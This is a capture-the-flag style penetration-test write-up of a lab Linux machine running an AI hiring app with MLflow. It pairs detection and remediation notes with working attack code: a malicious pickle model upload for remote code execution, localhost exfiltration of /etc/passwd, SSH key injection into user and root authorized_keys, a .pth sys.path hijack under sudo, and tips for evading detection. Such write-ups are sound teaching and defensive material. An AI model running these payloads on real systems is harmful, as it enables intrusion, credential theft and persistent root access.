# smarthire

**platform:** linux - medium

---

## summary

smarthire is a medium linux machine built around an ai-powered hiring platform backed by mlflow for ml model management, with three distinct phases in the kill chain

the first is discovering and gaining access to a hidden mlflow instance sitting behind http basic auth - vhost fuzzing reveals `models.smarthire.htb` returning a 401 with a `www-authenticate: basic realm="mlflow"` header, and default credentials (`admin:password`) open the mlflow ui and rest api without further work

the second is initial access via mlflow's pickle deserialization surface - the main application at `smarthire.htb` exposes a pipeline that trains a scikit-learn model on user-uploaded csv data, registers it to mlflow, and later loads it back via `mlflow.pyfunc.load_model()` on the `/predict` endpoint - because the `python_function` flavor stores models as pickle files on disk, registering a malicious `model.pkl` as a new model version and triggering `/predict` produces rce as `svcweb` - direct reverse shells are blocked by an egress firewall, so output is written to `/tmp/` and re-uploaded to the mlflow artifact store via `curl` to `localhost:5000`, then read back through the external api - an ssh key is injected into `authorized_keys` the same way for a persistent interactive shell

the third is privilege escalation via python `sys.path` hijacking - `sudo -l` shows `svcweb` can run `/usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *` as root without a password - the script iterates a `plugins/` directory and calls `site.addsitedir()` on each subdirectory before importing `mlflow_actions` and `backup_models` - the `dev/` plugin directory is writable by the `devs` group and `svcweb` is in `devs` - `site.addsitedir` processes `.pth` files and executes any line beginning with `import` at the time the directory is added, so a `.pth` file written to `dev/` that calls `sys.path.insert(0, ...)` prepends `dev/` before `core/` in the import resolution order, causing the subsequent `import mlflow_actions` to load a malicious version that writes an attacker ssh key into `/root/.ssh/authorized_keys`, giving a direct root shell via ssh without touching any system binary

---

## methodology notes

several things were tried and abandoned before the correct path was clear

the mlflow artifact upload api was initially hit with `POST` rather than `PUT` - the artifacts endpoint returns `405 method not allowed` for `POST` and the correct verb is not obvious from the docs at first read - a few minutes were lost before checking the raw http exchange from a legitimate artifact upload initiated by the app itself

the egress firewall was not immediately obvious - the first reverse shell via a bash tcp redirect produced nothing, a python3 socket shell produced nothing, and `curl http://10.10.15.213:8080` also returned nothing - this confirmed the firewall was dropping all outbound traffic rather than just common shell ports - the localhost exfil path came from noticing the application was already communicating with the mlflow api over loopback internally and was confirmed working before attempting key injection

at the privilege escalation stage, the initial assumption was that dropping a malicious `mlflow_actions.py` directly into `dev/` would shadow the one in `core/` - this failed because `core/` is iterated first by `Path.iterdir()` and its path is therefore prepended to `sys.path` before `dev/` - reading the cpython `site.addsitedir` source clarified the `.pth` execution behaviour, which is the correct bypass

---

## recon

### step 1 - port scan | t1046

a full tcp scan with a high minimum rate establishes the attack surface

```
nmap -p- --min-rate 5000 10.129.44.23
```

**findings:** 22/tcp openssh 8.9p1 ubuntu, 80/tcp nginx 1.18.0 - the http server redirects to `smarthire.htb`, which is added to `/etc/hosts` - only two ports are open and the attack surface is narrow

```
nmap -p22,80 -sCV 10.129.44.23
```

**findings:** the http title confirms the redirect - no additional services are visible

**logs generated:**
1. nginx access logs record the nmap http probe on port 80 with the nmap user-agent
2. sshd banner exchange is logged if verbose logging is enabled

**alerts triggered:**
1. rate-based ids alert if the syn packet rate exceeds baseline - `--min-rate 5000` across 65535 ports is not subtle
2. port scan detection rules in iptables or a host-based ids will match on the syn flood pattern

**network artifacts:**
1. high-rate tcp syn packets from attacker ip across all 65535 ports visible in flow records

**artifacts left:**
1. attacker source ip in nginx access logs from the http service probe

**sysmon/edr:** n/a - linux target - auditd `connect` rules would catch outbound from the server but not inbound scan packets without network-layer ids coverage

**siem correlation:**
1. correlate syn-only packets from a single source ip across a wide port range against the same destination ip - classic nmap full-port pattern

**sigma rule:** [net_scan_nmap](https://github.com/SigmaHQ/sigma/search?q=nmap) - community rules exist for nmap user-agent detection in web server logs and for syn flood patterns at the network layer

**bypass:** slow to `-T2` or `-T1` and distribute across multiple source ips - omit `-sV` probes to reduce the log footprint to syn-only traffic that blends into background noise more easily

**remediation:** perimeter rate limiting and ids rules tuned for single-source syn floods are the baseline - a vpn gateway or port knocking eliminates external scan exposure entirely

**opsec rating:** loud - `-p- --min-rate 5000` is detectable by any ids running default thresholds - acceptable on htb

---

### step 2 - virtual host fuzzing | t1595.003

the nginx server redirects to `smarthire.htb` and the main application does not hint at additional services - vhost fuzzing is required to find hidden backends

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://smarthire.htb \
  -H "Host: FUZZ.smarthire.htb" \
  -fc 301,302
```

**findings:** `models.smarthire.htb` responds with status 401 and a `www-authenticate: basic realm="mlflow"` header - this is an mlflow instance sitting behind http basic auth - it is added to `/etc/hosts` alongside the main vhost

directory enumeration is run against the main application:

```
gobuster dir -u http://smarthire.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt -t 50
```

**findings:** `/register`, `/login`, `/upload_hiring_data`, `/model_info`, and `/predict` are all accessible - the pipeline structure is already visible from the endpoint names before authentication

**logs generated:**
1. nginx access logs on `smarthire.htb` record all ffuf and gobuster requests with source ip and user-agent strings
2. nginx access logs on `models.smarthire.htb` record the 401 response for the matched vhost

**alerts triggered:**
1. siem threshold alert if the ffuf request rate from a single ip exceeds baseline http traffic
2. ids signature match on the gobuster user-agent string

**network artifacts:**
1. high-rate http requests with incrementally varying `host` header values from a single ip - the ffuf vhost pattern is distinctive in flow records

**artifacts left:**
1. source ip and user-agent strings preserved in nginx access logs across both vhosts

**sysmon/edr:** n/a - linux - auditd network rules would log the nginx process accepting connections but do not decode the http layer

**siem correlation:**
1. alert on high request rate from a single ip with varying `host` header values - this pattern has no legitimate use case at scale
2. correlate gobuster and ffuf user-agent strings appearing in web access logs

**sigma rule:** [web_scan_gobuster](https://github.com/SigmaHQ/sigma/search?q=gobuster) and ffuf user-agent detection rules in the community sigma collection apply directly

**bypass:** randomise user-agent per request with `-H "User-Agent: Mozilla/5.0 ..."` and reduce thread count to blend request rate into normal traffic - vhost fuzzing at 10 threads with a realistic user-agent is very difficult to distinguish from normal application traffic in access logs alone

**remediation:** returning identical responses for unlisted vhosts prevents external enumeration - waf rate limiting on the nginx layer provides a secondary control

**opsec rating:** loud - thread count and default user-agent strings are highly visible - acceptable on htb

---

## exploitation

### step 3 - mlflow default credentials | t1078.001

`models.smarthire.htb` returns a basic auth challenge - mlflow has well-known default credentials and testing them requires a single request before considering any credential attack

```
curl -s -u admin:password http://models.smarthire.htb/
```

**findings:** the response returns the mlflow ui html rather than a 401 - `admin:password` is valid - full access to the mlflow ui and rest api is available with no further work

**logs generated:**
1. nginx access logs on `models.smarthire.htb` record the successful authenticated request with source ip

**alerts triggered:**
1. no automated alert is likely from a single successful login at a default credential - most default mlflow deployments have no anomaly detection on the auth layer

**network artifacts:**
1. single http get with `authorization: basic` header from attacker ip to `models.smarthire.htb`

**artifacts left:**
1. attacker source ip in nginx access logs for the authenticated request

**sysmon/edr:** n/a - linux

**siem correlation:**
1. flag successful basic auth to the mlflow vhost from a previously unseen source ip - first-seen ip authentication against an admin credential is a meaningful anomaly

**sigma rule:** no dedicated mlflow sigma rule exists - generic web application authentication success from a new source ip rules apply

**bypass:** this is a single-attempt passive check - no rate limiting or account lockout is triggered by a correct credential on the first attempt

**remediation:** mlflow must not be deployed with default credentials - the http basic auth layer should be replaced with a proper identity provider - mlflow instances should not be internet-facing and should sit behind network-layer access control

**opsec rating:** quiet - a single successful authentication attempt against an admin account generates minimal log volume and no anomaly signal in isolation

---

### step 4 - mapping the ml pipeline | t1083

registering an account on the main application and mapping the ml pipeline reveals the full attack surface before any exploit is attempted

```
curl -X POST http://smarthire.htb/register \
  -d "username=testuser&company=testcorp&password=Password123" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c cookies.txt
```

a minimal training csv is uploaded to trigger model registration:

```
years_experience,education_level,hired
1,1,0
5,2,1
3,1,0
```

```
curl -X POST http://smarthire.htb/upload_hiring_data \
  -F "file=@train.csv" \
  -b cookies.txt
```

**findings:**

```json
{
  "registered_model": "testcorp-dc5a9779f456-model",
  "status": "success"
}
```

querying the mlflow api confirms the artifact path is `mlflow-artifacts:/0/{run_id}/artifacts/model` - the `/predict` endpoint loads the registered model via `mlflow.pyfunc.load_model()` - the `python_function` flavor stores models as pickle files - this is the deserialization surface

**logs generated:**
1. nginx access logs record the registration, upload, and model_info requests with the test account session
2. mlflow logs the model registration and run creation events internally

**alerts triggered:**
1. no anomaly on standard application usage - registration and csv upload are intended functionality and indistinguishable from legitimate use

**network artifacts:**
1. http post to `/upload_hiring_data` with a multipart csv payload

**artifacts left:**
1. test user account `testuser` and model `testcorp-dc5a9779f456-model` registered in mlflow and the application database

**sysmon/edr:** n/a - linux

**siem correlation:**
1. flag model registrations originating from accounts with no prior history - newly-registered accounts immediately registering models is an unusual usage pattern

**sigma rule:** no mlflow-specific sigma rule exists - application-layer siem logic is required to detect model registration anomalies

**bypass:** this step is normal application usage - no bypass required

**remediation:** the ml pipeline must not call `mlflow.pyfunc.load_model()` on models registered by external users without a validation or sandboxing layer - deserialization of untrusted pickle artifacts is categorically unsafe regardless of the source

**opsec rating:** quiet - normal application usage with no anomalous request patterns

---

### step 5 - mlflow malicious pickle rce | t1190, t1059.006

mlflow stores `python_function` flavor models as pickle files - when `/predict` calls `mlflow.pyfunc.load_model()` the pickle is deserialized in the context of the web process - registering a malicious model version via the rest api and triggering `/predict` produces rce

the attack has four stages: create a run, upload a malicious `mlmodel` manifest and `model.pkl`, register a new model version pointing to those artifacts, then trigger the load via `/predict`

rce is confirmed first with an icmp callback before escalating to command execution:

```python
import pickle, os, requests

MLFLOW_URL = "http://models.smarthire.htb"
AUTH = ("admin", "password")
MODEL_NAME = "testcorp-dc5a9779f456-model"
LHOST = "10.10.15.213"

class Shell(object):
    def __reduce__(self):
        return (os.system, (f"ping -c 3 {LHOST}",))

payload = pickle.dumps(Shell())

r = requests.post(f"{MLFLOW_URL}/api/2.0/mlflow/runs/create",
    auth=AUTH, json={"experiment_id": "0"})
run_id = r.json()["run"]["info"]["run_id"]

mlmodel = (
    f"artifact_path: model\nflavors:\n  python_function:\n"
    f"    loader_module: mlflow.sklearn\n    model_path: model.pkl\n"
    f"    python_version: 3.10.12\nmlflow_version: 2.9.2\nrun_id: {run_id}\n"
)

for fname, data in [("MLmodel", mlmodel.encode()), ("model.pkl", payload)]:
    requests.put(
        f"{MLFLOW_URL}/api/2.0/mlflow-artifacts/artifacts/0/{run_id}/artifacts/model/{fname}",
        auth=AUTH, data=data)

requests.post(f"{MLFLOW_URL}/api/2.0/mlflow/model-versions/create", auth=AUTH,
    json={"name": MODEL_NAME,
          "source": f"mlflow-artifacts:/0/{run_id}/artifacts/model",
          "run_id": run_id})
```

`tcpdump -i tun0 icmp` receives three icmp echo requests from the target - rce is confirmed

**findings:** the web process deserializes the malicious pickle on `/predict` and executes arbitrary commands as `svcweb`

**logs generated:**
1. nginx access logs record the `/predict` request that triggers deserialization
2. mlflow logs the run creation and model version registration events
3. auditd `execve` records the subprocess invocation spawned by `os.system` if syscall auditing covers the web process subtree
4. kernel logs may record the icmp packet generation from the unexpected subprocess

**alerts triggered:**
1. mlflow-side: a model version registered for an existing model where the source artifact path differs from the one the application originally created - this requires mlflow-aware alerting to catch
2. process-side: a web worker process spawning a child process that generates icmp traffic to an external ip is a high-confidence rce indicator for any edr with behavioural rules

**network artifacts:**
1. icmp echo requests from target to attacker ip - out-of-band callback directly confirming rce
2. `PUT` requests to the mlflow artifact api with a `model.pkl` payload from attacker ip

**artifacts left:**
1. malicious run and model version persisted in the mlflow database
2. `model.pkl` written to mlflow artifact storage on disk at the artifact path

**sysmon/edr:** linux edr with behavioural rules would alert on the web worker process forking a child that sends icmp to an external ip - this is a tier-1 indicator in any edr with parent-child process tree analysis

**siem correlation:**
1. alert on web process spawning network-capable subprocesses (`ping`, `curl`, `bash`, `python3`)
2. correlate mlflow model version creation from an authenticated session with a subsequent `/predict` request from the same session within a short time window

**sigma rule:** [proc_creation_linux_webshell_spawn](https://github.com/SigmaHQ/sigma/search?q=webshell+spawn) - rules detecting web process child spawning of shell utilities or network tools apply directly to this pattern

**bypass:** avoid `os.system` and use pure-python socket code to reduce subprocess spawn visibility - use an http callback to a domain passing through a cdn rather than icmp to avoid protocol-specific network detection

**remediation:** mlflow must not deserialize pickle artifacts from untrusted sources - the `/predict` endpoint must validate model provenance before loading - the `python_function` flavor should require cryptographic artifact signing - model loading should occur in a sandboxed subprocess with no network access and a read-only filesystem overlay

**opsec rating:** medium - the artifact registration is logged in mlflow - the subprocess spawn from the web worker is a strong behavioural indicator - the icmp callback is visible in flow logs - a blue team with edr coverage catches this near-realtime

---

### step 6 - egress bypass and data exfiltration via localhost | t1048.003

direct outbound connections are dropped by the egress firewall - the rce payload is modified to write command output to `/tmp/` and re-upload it to the mlflow artifact store using `curl` to `localhost:5000`, which is reachable because the mlflow api is bound on loopback - the exfiltrated file is then read back through the external-facing nginx proxy

the artifact is written under the same `run_id` created in step 5 - mlflow validates that the target run exists before accepting artifact uploads, so an arbitrary path like a static string would be rejected by backends that enforce run-scoped artifact storage - reusing the active run_id avoids this and keeps the artifact write within a context mlflow already recognises

```python
# run_id is the value captured from the run creation in step 5
class Shell(object):
    def __reduce__(self):
        cmd = (
            "whoami > /tmp/out.txt && id >> /tmp/out.txt && "
            "cat /etc/passwd >> /tmp/out.txt && "
            f"curl -s -u admin:password -X PUT "
            f"http://127.0.0.1:5000/api/2.0/mlflow-artifacts/artifacts/0/{run_id}/out.txt "
            "--data-binary @/tmp/out.txt"
        )
        return (os.system, (cmd,))
```

```
curl -s -u admin:password \
  "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/${run_id}/out.txt"
```

**findings:**

```
svcweb
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

the web process runs as `svcweb` - group membership includes `devs`, which will be the key to the privilege escalation path

**logs generated:**
1. mlflow artifact api logs the internal `curl PUT` request on `localhost:5000`
2. nginx access logs on `models.smarthire.htb` record the attacker's read-back `GET` request with source ip
3. auditd `execve` records the `curl` invocation and the `/tmp/` write if syscall rules cover the web process subtree

**alerts triggered:**
1. web process spawning `curl` and writing to `/tmp/` is anomalous - edr with parent-child process rules flags this in the same detection chain as the pickle rce step
2. mlflow api receiving artifact writes to a path not associated with a registered model run is an anomaly if mlflow activity is being monitored

**network artifacts:**
1. tcp connection from the web process to `127.0.0.1:5000` - loopback, not externally visible, but captured in auditd socket rules if they are configured to cover the web process

**artifacts left:**
1. `/tmp/out.txt` written to disk
2. `out.txt` artifact persisted in mlflow artifact storage

**sysmon/edr:** linux edr catches the `curl` spawn and the `/tmp/` write in the same parent-child chain as the rce confirmation - these two events together are a high-confidence post-exploitation indicator that is difficult to dismiss as a false positive

**siem correlation:**
1. correlate a web process writing to `/tmp/` with a subsequent `curl` call to `localhost` within the same process subtree - this sequence is not present in any legitimate web application workflow

**sigma rule:** generic rules for subprocess-driven `/tmp/` writes and localhost curl activity in community sigma collections apply - no mlflow-specific rule exists

**bypass:** avoid writing to `/tmp/` by piping output directly into `curl --data-binary @-` via process substitution - vary the mlflow artifact path to avoid matching on static path components used in the exfil

**remediation:** the mlflow artifact api must require authentication that is distinct from and not shared with the web application process credentials - a web service account should not hold credentials capable of writing arbitrary artifacts to the model store - network namespace isolation would prevent the web process from reaching the mlflow api on loopback

**opsec rating:** medium - the exfil path is entirely internal which avoids egress detection - the subprocess spawn chain from the web worker remains the primary detection surface and is unchanged from the rce confirmation step

---

### step 7 - ssh key injection | t1098.004

the same exfiltration primitive is used to write an attacker-controlled ssh public key into `svcweb`'s `authorized_keys`, giving a stable interactive shell that does not require an outbound connection from the target

this works precisely because of the asymmetry the egress firewall creates - the firewall drops all outbound connections initiated by the target, which is why every reverse shell attempt in step 6 produced nothing - it does not block inbound connections, so port 22 remains reachable from the attacker - an ssh session is attacker-initiated and inbound from the target's perspective, meaning it passes straight through where a reverse shell would be silently dropped

```python
class Shell(object):
    def __reduce__(self):
        cmd = (
            "mkdir -p /home/svcweb/.ssh && "
            "echo 'ssh-ed25519 AAAA...wntr@kali' "
            "> /home/svcweb/.ssh/authorized_keys && "
            "chmod 600 /home/svcweb/.ssh/authorized_keys"
        )
        return (os.system, (cmd,))
```

```
ssh -i /tmp/htb_key svcweb@10.129.44.23
```

**findings:** interactive ssh session established as `svcweb` - the shell is stable and interactive without any outbound connection from the target

**logs generated:**
1. `/var/log/auth.log` records the ssh public key authentication with source ip and key fingerprint
2. auditd `execve` records the `mkdir`, `echo`, and `chmod` subprocess invocations from the web process
3. sshd logs the accepted key authentication event

**alerts triggered:**
1. ssh login from a new source ip using key authentication where no key was previously present is a meaningful anomaly in any environment tracking ssh authentication events
2. web process modifying `authorized_keys` in a user home directory is a direct lateral movement indicator

**network artifacts:**
1. inbound tcp connection to port 22 from attacker ip - ssh handshake and encrypted session traffic

**artifacts left:**
1. attacker public key written to `/home/svcweb/.ssh/authorized_keys` - persists across reboots
2. source ip in `/var/log/auth.log` for the authenticated ssh session

**sysmon/edr:** linux edr with file integrity monitoring on `authorized_keys` paths fires immediately on the write - this is a tier-1 persistence indicator in any edr ruleset that covers ssh configuration files

**siem correlation:**
1. alert on writes to `*/authorized_keys` outside of an authorised provisioning workflow
2. correlate the `authorized_keys` write event with a subsequent ssh login from the same source ip within a short time window - this compound indicator is high-confidence even without edr

**sigma rule:** [file_event_linux_ssh_authorized_keys_modification](https://github.com/SigmaHQ/sigma/search?q=authorized_keys) - dedicated community rules for `authorized_keys` modification are widely deployed and well-maintained

**bypass:** use a key fingerprint that matches the naming pattern of legitimate provisioning tooling if the environment uses configuration management that rotates keys - timing the injection to coincide with a known rotation window reduces the anomaly signal

**remediation:** file integrity monitoring on all `authorized_keys` paths is the baseline control - the web process service account should have no write access to its own home directory ssh configuration - principle of least privilege: a web service account does not need the ability to modify its own ssh keys

**opsec rating:** medium-high - `authorized_keys` writes are a well-known detection target - fim tools catch this immediately and the subsequent ssh login from a new ip within minutes of the write is a high-confidence compound indicator

---

## privilege escalation

### step 8 - sudo enumeration | t1033

standard sudo enumeration after landing the shell

```
sudo -l
```

**findings:**

```
user svcweb may run the following commands on smarthire:
  (root) nopasswd: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

a specific python script is executable as root without a password - the `*` wildcard passes arbitrary arguments - the script and its surrounding directory structure are the next target

**logs generated:**
1. `sudo -l` is not logged by default unless `log_input` and `log_output` are enabled in `/etc/sudoers`

**alerts triggered:**
1. no alert fires on `sudo -l` in a default sudo configuration

**network artifacts:**
1. none

**artifacts left:**
1. none - `sudo -l` is a read-only query with no filesystem side effects

**sysmon/edr:** auditd rules for `execve` of `sudo` would log this invocation - not typically a high-priority alert in isolation

**siem correlation:**
1. correlate `sudo -l` execution by a newly-authenticated session with subsequent sudo invocations - the gap between enumeration and exploitation is a useful timeline indicator for incident response

**sigma rule:** [proc_creation_linux_sudo_usage](https://github.com/SigmaHQ/sigma/search?q=sudo) - generic sudo execution rules exist in the community collection

**bypass:** passive query with no bypass needed

**remediation:** sudoers entries must be restricted to the minimum necessary - scripts executable as root via `nopasswd` must be reviewed for hijack paths before deployment - the `*` wildcard on a python interpreter invocation is particularly dangerous and should be avoided

**opsec rating:** quiet - single read-only query with no observable side effects

---

### step 9 - analysing mlflowctl.py | t1083

reading the target script and mapping the plugin directory permissions to identify the writable entry point

```python
from pathlib import Path
import sys, site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def main():
    import mlflow_actions, backup_models
    ...
```

```
ls -la /opt/tools/mlflow_ctl/plugins/
```

**findings:**

```
drwxr-xr-x  root root   core/
drwxrwxr-x  root devs   dev/
```

`dev/` is writable by the `devs` group and `svcweb` is in `devs` - however, `core/` is processed first by `Path.iterdir()`, meaning `core/` is prepended to `sys.path` before `dev/`, so a malicious `mlflow_actions.py` dropped directly into `dev/` will not shadow the one in `core/` - a different approach is needed to insert `dev/` before `core/` in the resolution order

**logs generated:**
1. none for reading filesystem metadata

**alerts triggered:**
1. none

**network artifacts:**
1. none

**artifacts left:**
1. none - passive reads only

**sysmon/edr:** n/a

**siem correlation:** n/a

**sigma rule:** n/a

**bypass:** n/a

**remediation:** plugin directories writable by non-root users must never appear on the `sys.path` of a root-run python process under any circumstances - if a plugin architecture is required, plugins must be cryptographically signed and installed to a root-owned read-only location

**opsec rating:** quiet - filesystem reads generate no alerts

---

### step 10 - sys.path hijack via .pth file | t1574.001

`site.addsitedir` processes `.pth` files in each directory it is given - any line in a `.pth` file that begins with `import` is executed as python code at the time the directory is processed, before any module imports occur - writing a `.pth` file to `dev/` that calls `sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')` prepends `dev/` to `sys.path` at the moment `site.addsitedir` processes it, before the loop continues to `core/` - the subsequent `import mlflow_actions` then resolves to a malicious module placed in `dev/` rather than the legitimate one in `core/`

since the malicious module already executes as root via the sudo chain, the cleanest path to access is injecting a key directly into `/root/.ssh/authorized_keys` - this avoids touching any system binary and leaves no suid modification on disk

```
cat > /opt/tools/mlflow_ctl/plugins/dev/evil.pth << 'EOF'
import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')
EOF

cat > /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py << 'EOF'
import os

def check_status():
    os.system("mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA...wntr@kali' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys")

def restart():
    os.system("mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA...wntr@kali' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys")
EOF
```

```
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
ssh -i /tmp/htb_key root@10.129.44.23
```

**findings:**

```
root@smarthire:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**logs generated:**
1. auditd `execve` records the `sudo python3.10 mlflowctl.py status` invocation with the invoking user
2. `/var/log/auth.log` records the sudo execution event
3. auditd records the `mkdir`, `echo`, and `chmod` calls spawned by the malicious `mlflow_actions.py` as children of the root python3 process
4. `/var/log/auth.log` records the ssh public key authentication for root from the attacker ip

**alerts triggered:**
1. the sudo invocation of the target script is expected behaviour on its own and may not alert
2. a root python3 process writing to `/root/.ssh/authorized_keys` is anomalous - any edr with file integrity monitoring on root's home directory fires here
3. an ssh login as root from a new source ip is a high-confidence indicator regardless of the authentication method used

**network artifacts:**
1. inbound tcp connection to port 22 from attacker ip - ssh handshake and session traffic as root

**artifacts left:**
1. `evil.pth` written to `/opt/tools/mlflow_ctl/plugins/dev/`
2. malicious `mlflow_actions.py` written to `/opt/tools/mlflow_ctl/plugins/dev/`
3. attacker public key appended to `/root/.ssh/authorized_keys` - persists across reboots

**sysmon/edr:** linux edr with fim on `/root/.ssh/` catches the `authorized_keys` write immediately - unlike the suid approach, this does not modify any system binary, which makes it quieter against rulesets focused on binary integrity - however root-homedir writes from a python subprocess are still anomalous and most edr behavioural rulesets cover them

**siem correlation:**
1. alert on writes to `/root/.ssh/authorized_keys` by any non-interactive process - this has no legitimate use case outside of a provisioning tool running in a known maintenance window
2. correlate `.pth` file creation in the plugins directory with the subsequent sudo invocation within the same session
3. alert on root ssh logins from previously unseen source ips

**sigma rule:** [file_event_linux_ssh_authorized_keys_modification](https://github.com/SigmaHQ/sigma/search?q=authorized_keys) - the same rule category that fires in step 7 applies here for root's `authorized_keys` - root-targeted variants of this rule are typically set to a higher severity tier

**bypass:** if fim is active on `/root/.ssh/`, read the root flag directly from the module via `open('/root/root.txt').read()` and write it to a world-readable path - this achieves the objective with zero filesystem side effects beyond the plugin files already written

**remediation:** the plugin loading architecture in `mlflowctl.py` is the root cause - using `site.addsitedir` with a partially group-writable directory tree under a root-run script is categorically insecure - correct remediation is to remove dynamic plugin loading entirely and hard-code import paths - if plugins are genuinely required, they must be installed to a system `site-packages` directory owned by root with no group-write permissions - fim on `/root/.ssh/` and alerts on root ssh logins from new ips should be baseline controls regardless of this specific vulnerability

**opsec rating:** medium-low - the `.pth` file write and the `authorized_keys` modification are both detectable by fim - however neither touches a system binary, making this significantly quieter than a suid approach against rulesets focused on binary integrity - the root ssh login is the clearest post-exploitation signal and is always anomalous on a server that has no legitimate remote root access pattern

---

## detection map

| step | technique | mitre id | detectability |
|---|---|---|---|
| port scan | network service scanning | t1046 | medium - rate-based ids |
| vhost fuzzing | wordlist scanning | t1595.003 | high - user-agent + rate |
| mlflow default credentials | default accounts | t1078.001 | low - single successful auth |
| ml pipeline enumeration | file and directory discovery | t1083 | low - normal app usage |
| malicious pickle rce | exploit public-facing app + python execution | t1190, t1059.006 | medium - web worker subprocess spawn |
| egress bypass via localhost | exfil over alternative protocol | t1048.003 | medium - subprocess curl to loopback |
| ssh key injection | ssh authorized keys | t1098.004 | high - authorized_keys fim |
| sudo enumeration | system owner discovery | t1033 | low - passive read |
| plugin directory analysis | file and directory discovery | t1083 | low - passive read |
| .pth file sys.path hijack | hijack execution flow | t1574.001 | medium-low - root authorized_keys write + new ssh login |

---

## would i get caught

the attack chain has two near-certain detection moments in a well-instrumented environment, and one phase where visibility depends entirely on whether mlflow activity is feeding a siem

the early phases are quiet - default credential testing generates a single successful auth event against an admin account and nothing more - normal application usage for the ml pipeline enumeration is indistinguishable from a legitimate user building a hiring model - the malicious pickle registration is logged in mlflow but is only anomalous in retrospect, requiring mlflow-aware siem logic and a baseline of what legitimate model versions look like to catch

the rce confirmation is where a mature blue team gets a clear signal - a web worker process spawning `/bin/sh -c ping` is not ambiguous and has no legitimate explanation - linux edr with behavioural rules catches this immediately - the egress firewall blocks the reverse shell but does not eliminate the detection surface, because the subprocess spawn from the web worker is the primary indicator regardless of where the traffic is directed - if auditd `execve` coverage includes the web process subtree, every command run via the pickle payload is logged in full including the command strings themselves

the `authorized_keys` write is a tier-1 persistence indicator - fim tools watching ssh configuration paths fire on this immediately - the subsequent login from a new ip within minutes of the write is a high-confidence compound indicator that is difficult to dismiss even without edr

the privilege escalation is where a partially-instrumented environment might fail to connect the dots - the sudo invocation is legitimate on its surface and the `.pth` file write to a writable plugin directory may not individually trigger an alert - the `authorized_keys` write to root's home directory by a python subprocess is detectable by fim, but it does not touch any system binary, making it quieter than a suid approach against rulesets focused on binary integrity - the clearest signal here is the root ssh login from a new ip arriving minutes after the sudo invocation, which is a high-confidence compound indicator when those two events are correlated on a timeline

the primary failure mode for this defence is an mlflow deployment with no siem integration and a host without edr or auditd coverage - in that environment, the pickle rce, the localhost exfil, the key injection, and the privesc all complete without a single alert - the attack is loud during the enumeration phase and silent everywhere else - the irony is that the mlflow layer, which is the most distinctive and unusual component of the kill chain, is also the one least likely to have any dedicated monitoring in a real deployment
